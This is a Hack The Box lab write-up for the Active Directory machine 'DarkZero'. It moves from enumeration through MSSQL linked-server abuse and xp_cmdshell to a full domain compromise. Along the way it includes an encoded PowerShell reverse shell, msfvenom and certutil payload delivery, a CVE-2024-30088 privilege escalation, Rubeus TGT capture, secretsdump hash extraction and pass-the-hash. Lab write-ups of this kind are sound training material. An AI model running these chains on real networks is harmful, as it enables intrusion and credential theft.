- - - 
created : 05-10-2025 

Tags : #medium 

Released on 04 Oct 2025 (Season 9)
- - - 
# Machine Information

As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w / RFulUtONCOL!`

# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ rustscan -a darkzero.htb -- -A
Open 10.10.11.89:53
Open 10.10.11.89:88
Open 10.10.11.89:135
Open 10.10.11.89:139
Open 10.10.11.89:389
Open 10.10.11.89:445
Open 10.10.11.89:464
Open 10.10.11.89:593
Open 10.10.11.89:636
Open 10.10.11.89:1433
Open 10.10.11.89:2179
Open 10.10.11.89:3269
Open 10.10.11.89:3268
Open 10.10.11.89:5985
Open 10.10.11.89:9389
Open 10.10.11.89:49664
Open 10.10.11.89:49666
Open 10.10.11.89:49682
Open 10.10.11.89:49683
Open 10.10.11.89:49905
Open 10.10.11.89:49928
Open 10.10.11.89:49964
Open 10.10.11.89:63485

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-05 17:15:57Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Issuer: commonName=darkzero-DC01-CA/domainComponent=darkzero


445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb


1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-10-05T17:17:51+00:00; +7h00m00s from scanner time.
| ms-sql-info: 
|   10.10.11.89:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)

3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb


5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49683/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49905/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49928/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49964/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63485/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

```

This is a [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md) environment, you can check [Intro to Active Directory Theory](../Academy/Intro%20to%20Active%20Directory%20Theory.md) to better understand all processes.

Let's add `dc01.darkzero.htb` to `/etc/hosts`.
# Enumeration
## SMB (135,139,445)

We try to list the shares with the credentials using [SMBclient](../../../3%20-%20Tags/Hacking%20Tools/SMBclient.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero]
└─$ smbclient -L \\\\darkzero.htb\\ -U john.w
Password for [WORKGROUP\john.w]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to darkzero.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

OR `nxc`

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero]
└─$ nxc smb darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' --shares
SMB         10.10.11.89     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.89     445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.10.11.89     445    DC01             [*] Enumerated shares
SMB         10.10.11.89     445    DC01             Share           Permissions     Remark
SMB         10.10.11.89     445    DC01             -----           -----------     ------
SMB         10.10.11.89     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.89     445    DC01             C$                              Default share
SMB         10.10.11.89     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.89     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.89     445    DC01             SYSVOL          READ            Logon server share
```

Check SYSVOL:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/user]
└─$ smbclient \\\\darkzero.htb\\SYSVOL -U john.w 
Password for [WORKGROUP\john.w]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 29 13:39:08 2025
  ..                                  D        0  Tue Jul 29 13:39:08 2025
  darkzero.htb                       Dr        0  Tue Jul 29 13:39:08 2025

smb: \> cd darkzero.htb\

smb: \darkzero.htb\> ls
  .                                   D        0  Tue Jul 29 13:45:53 2025
  ..                                  D        0  Tue Jul 29 13:39:08 2025
  DfsrPrivate                      DHSr        0  Tue Jul 29 13:45:53 2025
  Policies                            D        0  Tue Jul 29 13:39:19 2025
  scripts                             D        0  Tue Jul 29 13:39:08 2025

```
## Bloodhound

Synchronize the time:

```bash
└─$ sudo timedatectl set-ntp off

└─$ sudo rdate -n 10.10.11.89
Sun Oct  5 19:27:49 CEST 2025
```

We collect and ingest with [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/user]
└─$ bloodhound-python -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.10.11.89 -c All --zip     
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.darkzero.htb
INFO: Done in 00M 11S
INFO: Compressing output into 20251005195017_bloodhound.zip
```

We can open the GUI:

![Pasted image 20251005230349.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251005230349.png)

We are member of `Domain Users` :

![Pasted image 20251005230512.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251005230512.png)

`Administrator` is also a member of this group.

## MSSQL (1433)

We use `nxc`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/user]
└─$ nxc mssql darkzero.htb -u john.w -p 'RFulUtONCOL!'
MSSQL       10.10.11.89     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
MSSQL       10.10.11.89     1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
```
# Exploit

https://www.bordergate.co.uk/attacking-mssql/
## Shell

We can use `impacket` to gain a shell:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ impacket-mssqlclient john.w:'RFulUtONCOL!'@darkzero.htb -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands

SQL (darkzero\john.w  guest@tempdb)> enum_db
[%] select name, is_trustworthy_on from sys.databases
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   
 
[%] select * from msdb.INFORMATION_SCHEMA.TABLES
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME                                   TABLE_TYPE   
-------------   ------------   ------------------------------------------   ----------   
msdb            dbo            syspolicy_policy_category_subscriptions      b'VIEW'      

msdb            dbo            syspolicy_system_health_state                b'VIEW'      

msdb            dbo            syspolicy_policy_execution_history           b'VIEW'      

msdb            dbo            syspolicy_policy_execution_history_details   b'VIEW'      

msdb            dbo            syspolicy_configuration                      b'VIEW'      

msdb            dbo            syspolicy_conditions                         b'VIEW'      

msdb            dbo            syspolicy_policy_categories                  b'VIEW'      

msdb            dbo            sysdac_instances                             b'VIEW'      

msdb            dbo            syspolicy_object_sets                        b'VIEW'      

msdb            dbo            dm_hadr_automatic_seeding_history            b'BASE TABLE'   

msdb            dbo            syspolicy_policies                           b'VIEW'      

msdb            dbo            backupmediaset                               b'BASE TABLE'   

msdb            dbo            backupmediafamily                            b'BASE TABLE'   

msdb            dbo            backupset                                    b'BASE TABLE'   

msdb            dbo            autoadmin_backup_configuration_summary       b'VIEW'      

msdb            dbo            backupfile                                   b'BASE TABLE'   

msdb            dbo            syspolicy_target_sets                        b'VIEW'      

msdb            dbo            restorehistory                               b'BASE TABLE'   

msdb            dbo            restorefile                                  b'BASE TABLE'   

msdb            dbo            syspolicy_target_set_levels                  b'VIEW'      

msdb            dbo            restorefilegroup                             b'BASE TABLE'   

msdb            dbo            logmarkhistory                               b'BASE TABLE'   

msdb            dbo            suspect_pages                                b'BASE TABLE'

SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc  
```

We can use the found link to enable the `xp_cmdshell`: 

```
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
output                 
--------------------   
darkzero-ext\svc_sql   

NULL  
```

We can gain a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md): https://www.revshells.com/

```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAwACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

```

On [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/user]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.14.90] from (UNKNOWN) [10.10.11.89] 52803
whoami
darkzero-ext\svc_sql
```
# Privilege Escalation
### CVE-2024-30088

PoC : https://github.com/tykawaii98/CVE-2024-30088
## Msfvenom

Craft the payload:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/user]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.90 LPORT=4443 -f exe -o meterpreter.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 203846 bytes
Final size of exe file: 210944 bytes
Saved as: meterpreter.exe
```

Transfer from working directory:

```bash
$ python3 -m http.server 5000
```

On target:

```bash
PS C:\Users\svc_sql\Downloads> certutil -urlcache -split -f http://10.10.14.90:5000/meterpreter.exe meterpreter.exe

****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
PS C:\Users\svc_sql\Downloads> ls
ls


    Directory: C:\Users\svc_sql\Downloads


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         10/5/2025   5:54 PM           7168 meterpreter.exe   
```
## Metasploit

Set Up [Metasploit-Framework (MSF)](../../../3%20-%20Tags/Hacking%20Tools/Metasploit-Framework%20(MSF).md) Listener:

```bash
└─$ msfconsole                                                                                        

msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 
payload => windows/x64/meterpreter_reverse_tcp

msf exploit(multi/handler) > set lhost tun0
lhost => tun0
msf exploit(multi/handler) > set lport 4443
lport => 4443

msf exploit(multi/handler) > set exitfunc none
exitfunc => none

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.90:4443 
[*] Sending stage (177734 bytes) to 10.10.11.89
```

On target:

```powershell
PS C:\Users\svc_sql\Downloads> .\meterpreter.exe
```

We can use use `post/multi/recon/local_exploit_suggester` in [Metasploit-Framework (MSF)](../../../3%20-%20Tags/Hacking%20Tools/Metasploit-Framework%20(MSF).md):

```bash
meterpreter > ^Z
Background session 1? [y/N]  y
[-] Unknown command: y. Run the help command for more details.

msf exploit(multi/handler) > use multi/recon/local_exploit_suggester

msf post(multi/recon/local_exploit_suggester) > set session 1                                          
session => 1                                                                                           
msf post(multi/recon/local_exploit_suggester) > run 
```

We can gain a `nt\authority system` session:

```bash
msf exploit(windows/local/cve_2024_30088_authz_basep) > options

Module options (exploit/windows/local/cve_2024_30088_authz_basep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.90      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64

msf exploit(windows/local/cve_2024_30088_authz_basep) > run
[*] Started reverse TCP handler on 10.10.14.90:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
[*] Reflectively injecting the DLL into 2844...
[+] The exploit was successful, reading SYSTEM token from memory...
[+] Successfully stole winlogon handle: 768
[+] Successfully retrieved winlogon pid: 600
[*] Sending stage (203846 bytes) to 10.10.11.89
[*] Meterpreter session 2 opened (10.10.14.90:4444 -> 10.10.11.89:54718) at 2025-10-05 22:13:17 +0200

meterpreter > shell
Process 4452 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We can retrieve the user flag on Administrator's desktop:

```powershell
C:\Users\Administrator\Desktop>type user.txt
type user.txt
    HTB{REDACTED_FLAG}
```

## Root Flag

To retrieve the root flag we have to dump the administrator hash.
### Unconstrained Delegation

https://pentestlab.blog/2022/03/21/unconstrained-delegation/

https://www.hackingarticles.in/domain-escalation-unconstrained-delegation/

Verify:

```bash
PS C:\Users\Administrator\Downloads> Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description


Description          : 
DistinguishedName    : CN=DC02,OU=Domain Controllers,DC=darkzero,DC=ext
DNSHostName          : DC02.darkzero.ext
Enabled              : True
Name                 : DC02
ObjectClass          : computer
ObjectGUID           : f85520d0-db6e-4a92-9ebc-f01d6d4cc268
SamAccountName       : DC02$
serviceprincipalname : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC02.darkzero.ext, 
                       ldap/DC02.darkzero.ext/ForestDnsZones.darkzero.ext, 
                       ldap/DC02.darkzero.ext/DomainDnsZones.darkzero.ext, TERMSRV/DC02...}
SID                  : S-1-5-21-1969715525-31638512-2552845157-1000
TrustedForDelegation : True
UserPrincipalName    : 
```

Now, on the target system we need to run Rubeus in monitor mode on the `dc01` system. After that, whenever a user connects/authenticates to `dc01$` Rubeus will dump the `TGT` of the user.

Add `DC02.darkzero.ext` and `darkzero.ext` to `/etc/hosts`.
### Rubeus.exe Hashdump

[Rubeus Guide](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)

[Rubeus binary](https://github.com/GhostPack/Rubeus)

[Compiled Binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git)

We download:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/DarkZero/user/binaries]
└─$ git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
Clone in 'Ghostpack-CompiledBinaries' in corso...
remote: Enumerating objects: 729, done.
remote: Counting objects: 100% (219/219), done.
remote: Compressing objects: 100% (124/124), done.
remote: Total 729 (delta 138), reused 135 (delta 95), pack-reused 510 (from 1)
Ricezione degli oggetti: 100% (729/729), 21.28 MiB | 3.64 MiB/s, fatto.
Risoluzione dei delta: 100% (481/481), fatto.
```

We host a server and transfer Rubeus.exe:

```bash
PS C:\Users\Administrator\Downloads> certutil -urlcache -split -f http://10.10.14.90:5000/Rubeus.exe Rubeus.exe
certutil -urlcache -split -f http://10.10.14.90:5000/Rubeus.exe Rubeus.exe
****  Online  ****
  000000  ...
  06d200
CertUtil: -URLCache command completed successfully.
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/user]
└─$ python3 -m http.server 5000
Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ...
10.10.11.89 - - [06/Oct/2025 10:37:02] "GET /Rubeus.exe HTTP/1.1" 200 -
10.10.11.89 - - [06/Oct/2025 10:37:02] "GET /Rubeus.exe HTTP/1.1" 200 -
```

Rubeus to monitor on `dc02` and `mssql` to trigger `dc01` ticket:

```powershell
PS C:\Users\Administrator\Downloads> ./Rubeus.exe monitor /monitorinterval:10 /administrator:dc01$ /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Monitoring every 10 seconds for new TGTs


[*] 10/6/2025 3:41:56 PM UTC - Found new TGT:

  User                  :  Administrator@DARKZERO.EXT
  StartTime             :  10/6/2025 8:35:20 AM
  EndTime               :  10/6/2025 6:35:20 PM
  RenewTill             :  10/13/2025 8:35:20 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

<SNIP>
[*] Ticket cache size: 5

[*] 10/6/2025 6:06:13 PM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/6/2025 11:06:11 AM
  EndTime               :  10/6/2025 9:06:11 PM
  RenewTill             :  10/13/2025 11:06:11 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDYEJPBNF/Yt3Q6eW6Oi5cgdwBiTNrHoGMDsCoK2nyoAUMqZN1z2rtosGgQVc/VOXP5sKWFyrtseV0jiY2jcpC5T4Z1QGZ14zzBpvhl6gGiV1ss6wPyerYkoDZBX9lnHmp9waX+X4k3rlgYifMmlxPedvTfM0DJ2te4uoOOAat+8qCvM1lCaZL83p4S9NbpI5q6zgzs0fOJK9z7Bd7+RnZBXcGa3jfTR7XO5kqbDIs7DC+0pNOnM+V9RVQsEUdQwdux8cHNIkLr7LHkabboUwbw03sWJo1Z10NfRqCcl8LQahgDdITzYsjfqPquPQPN40hjD2CmXEegrlkg5FTRWoaaU67cEv2qNY7cM5PL1ixW1s3PxZvg8cCuBMsTmn2XThfQ9TH2aggmAQSKd0rQk2iVaTvFPfR5AynioO14dLH3AdrxzmAHefDXEUoQZE/1OTFVL0QI2/sL9Kd5JZxoKhZo0hrOs+Md8yXGnJjtmcMmQGZDMKZ4mHwNHH/uafwJjr8iItn/gWa4DTyznPh6o2gRwvW8W0FTsYJEC6/U5lMtSAq76mWPG196m8XkPOSaglxNiSlAr5hxDXgPZY+DXkXOMJ75rLifFrayJ2cJnHTB{REDACTED_HASH}
```

We can save this last one `DC01` as `ticket.kirbi.b64` and decode it:

```bash
└─$ nano ticket.kirbi.b64 

└─$ base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Now we convert it to a `.ccache` ticket with [Metasploit-Framework (MSF)](../../../3%20-%20Tags/Hacking%20Tools/Metasploit-Framework%20(MSF).md) module:

```bash
msf exploit(windows/local/cve_2024_30088_authz_basep) > use auxiliary/admin/kerberos/ticket_converter

msf auxiliary(admin/kerberos/ticket_converter) > set InputPath ./ticket.kirbi
InputPath => ./ticket.kirbi

msf auxiliary(admin/kerberos/ticket_converter) > set OutputPath ./ticket.ccache
OutputPath => ./ticket.ccache

msf auxiliary(admin/kerberos/ticket_converter) > run
[*] Converting from kirbi to ccache
[*] File written to /home/mdn0x/HTB/Machines/DarkZero/root/ticket.ccache
[*] Auxiliary module execution completed
```

Now we can export it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/root]
└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/DarkZero/root/ticket.ccache 
```

Check with `klist`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/root]
└─$ klist
Ticket cache: FILE:/home/mdn0x/HTB/Machines/DarkZero/root/ticket.ccache
Default principal: DC01$@DARKZERO.HTB

Valid starting       Expires              Service principal
06/10/2025 20:06:11  07/10/2025 06:06:11  krbtgt/DARKZERO.HTB@DARKZERO.HTB
        renew until 13/10/2025 20:06:11
```

Modify `krb5.conf` for realm:

```bash
$ sudo nano /etc/krb5.conf 

<SNIP>
                default_domain = utoronto.ca
        }
      DARKZERO.HTB = {
                kdc = dc01.darkzero.htb
                admin_server = dc01.darkzero.htb
                default_domain = darkzero.htb
        }

[domain_realm]
<SNIP>

     .toronto.edu = UTORONTO.CA
        .utoronto.ca = UTORONTO.CA
       .darkzero.htb = DARKZERO.HTB
        darkzero.htb = DARKZERO.HTB
       .darkzero.ext = DARKZERO.EXT
        darkzero.ext = DARKZERO.EXT

<SNIP>
```

Dump `Administrator` hashes:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/root]
└─$ faketime 'now 7 hours' impacket-secretsdump -k -no-pass DARKZERO.HTB/DC01\$@dc01.darkzero.htb -just-dc-user administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
[*] Kerberos keys grabbed
Administrator:0x14:HTB{REDACTED_HASH}
Administrator:0x13:HTB{REDACTED_HASH}
Administrator:aes256-cts-hmac-sha1-96:HTB{REDACTED_HASH}
Administrator:aes128-cts-hmac-sha1-96:HTB{REDACTED_HASH}
Administrator:0x17:HTB{REDACTED_HASH}
[*] Cleaning up... 
```

Now use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) to Pass-the-hash:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/DarkZero/root]
└─$ evil-winrm -u 'Administrator' -H 'HTB{REDACTED_HASH}' -i dc01.darkzero.htb 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         10/6/2025  10:53 AM             34 root.txt
-ar---         10/6/2025  10:53 AM             34 user.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
    HTB{REDACTED_FLAG}
```

Pwned !!